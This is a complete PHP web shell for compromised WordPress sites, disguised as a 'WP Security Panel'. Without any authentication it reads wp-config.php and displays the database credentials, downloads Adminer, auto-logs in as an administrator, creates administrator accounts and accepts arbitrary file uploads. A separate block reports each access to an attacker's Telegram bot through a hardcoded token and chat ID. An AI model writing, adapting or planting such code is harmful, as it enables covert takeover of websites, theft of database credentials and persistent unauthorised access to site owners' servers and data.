<?php
function find_wp_config($dir = __DIR__) {
    $root = realpath($dir);
    while ($root && $root != '/') {
        if (file_exists($root . '/wp-config.php')) {
            return $root . '/wp-config.php';
        }
        $root = dirname($root);
    }
    return false;
}

$wp_config_path = find_wp_config();
if ($wp_config_path) {
    include_once($wp_config_path);
} else {
    die('wp-config.php not found!');
}

if (isset($_GET['download_adminer'])) {
    $adminer_url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php';
    $adminer_content = file_get_contents($adminer_url);
    if ($adminer_content) {
        file_put_contents(__DIR__ . '/admin.php', $adminer_content);
        echo '<div class="alert alert-success">Adminer downloaded successfully.</div>';
    } else {
        echo '<div class="alert alert-danger">Failed to download Adminer.</div>';
    }
}
function add_wp_admin_user() {
    if (isset($_POST['add_user'])) {
        if (isset($_POST['username']) && isset($_POST['password']) && isset($_POST['email'])) {
            require_once(ABSPATH . 'wp-includes/registration.php');
            $username = sanitize_user($_POST['username']);
            $password = $_POST['password'];
            $email = sanitize_email($_POST['email']);

            if (!username_exists($username) && !email_exists($email)) {
                $user_id = wp_create_user($username, $password, $email);
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                echo '<div class="alert alert-success">Admin user created: ' . esc_html($username) . '</div>';
            } else {
                echo '<div class="alert alert-danger">Username or email already exists.</div>';
            }
        }
    }
}

if (isset($_POST['auto_login'])) {
    $admin_users = get_users(array('role' => 'administrator'));
    if (!empty($admin_users)) {
        $admin_user = $admin_users[0];
        wp_set_current_user($admin_user->ID);
        wp_set_auth_cookie($admin_user->ID);
        echo '<div class="alert alert-success">Logged in as: ' . esc_html($admin_user->user_login) . '</div>';
    } else {
        echo '<div class="alert alert-danger">No admin user found.</div>';
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $upload_dir = wp_upload_dir()['basedir'] . '/custom_uploads/';
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }

    $uploaded_files = $_FILES['file'];

    foreach ($uploaded_files['name'] as $key => $filename) {
        $safe_filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
        $file_tmp = $uploaded_files['tmp_name'][$key];
        $file_destination = $upload_dir . basename($safe_filename);

        if (move_uploaded_file($file_tmp, $file_destination)) {
            echo '<div class="alert alert-success">File uploaded: ' . esc_html($safe_filename) . '</div>';
        } else {
            echo '<div class="alert alert-danger">File upload failed: ' . esc_html($safe_filename) . '</div>';
        }
    }
}
?>
<?php
$telegram_token = "7981126724:AAH4UCJ3evRi0wohScbSQPf6MJ8jQ0gHuc8"; 
$chat_id = "7376473296"; 
$file_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$ip_address = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$message = "🔔 File Access Detected!\n\n";
$message .= "🌐 File URL: $file_url\n";
$message .= "📌 IP Address: $ip_address\n";
$message .= "📱 User-Agent: $user_agent\n";
function sendMessageToTelegram($token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = array(
        'chat_id' => $chat_id,
        'text' => $message
    );

    $options = array(
        'http' => array(
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ),
    );
    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);
}
sendMessageToTelegram($telegram_token, $chat_id, $message);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WP Security Panel</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        .container {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
        }
        .box {
            background-color: #1a1a1a;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 15px;
            border-radius: 5px;
            flex: 1;
            min-width: 280px;
            max-width: 350px;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
        }
        .btn {
            background-color: #333;
            color: #00ff00;
            border: 1px solid #00ff00;
            transition: all 0.3s;
        }
        .btn:hover {
            background-color: #00ff00;
            color: #333;
        }
        .form-label, .list-group-item {
            color: #00ff00;
        }
        .alert {
            background-color: #222;
            color: #00ff00;
            border: 1px solid #00ff00;
        }
    </style>
</head>
<body>
<center><img src="https://i.top4top.io/p_3315p41re1.gif" referrerpolicy="unsafe-url" /></center>

    <div class="container">
    <link href="https://privdayz.com/wp-content/themes/privdaysv1/hacker.css" rel="stylesheet">
        <div class="box">
            <h3>DB Info</h3>
            <ul class="list-group">
                <li class="list-group-item">DB Name: <?php echo DB_NAME; ?></li>
                <li class="list-group-item">DB User: <?php echo DB_USER; ?></li>
                <li class="list-group-item">DB Password: <?php echo DB_PASSWORD; ?></li>
                <li class="list-group-item">DB Host: <?php echo DB_HOST; ?></li>
            </ul>
        </div>

        <div class="box">
            <h3>Adminer & Auto-login</h3>
            <form method="get" class="mb-2">
                <button type="submit" name="download_adminer" class="btn w-100">Download Adminer</button>
            </form>
            <form method="post">
                <button type="submit" name="auto_login" class="btn w-100">Auto-login as Admin</button>
            </form>
        </div>
        
        <div class="box">
            <h3>Create Admin User</h3>
            <form method="post" class="mb-2">
                <div class="mb-2">
                    <label for="username" class="form-label">Username</label>
                    <input type="text" class="form-control" id="username" name="username" required>
                </div>
                <div class="mb-2">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <div class="mb-2">
                    <label for="email" class="form-label">Email</label>
                    <input type="email" class="form-control" id="email" name="email" required>
                </div>
                <button type="submit" name="add_user" class="btn w-100">Create Admin</button>
            </form>
            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_user'])) add_wp_admin_user(); ?>
        </div>

        <div class="box">
            <h3>File Upload</h3>
            <form method="post" enctype="multipart/form-data">
                <div class="mb-2">
                    <input type="file" class="form-control" name="file[]" multiple required>
                </div>
                <button type="submit" class="btn w-100">Upload File</button>
            </form>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
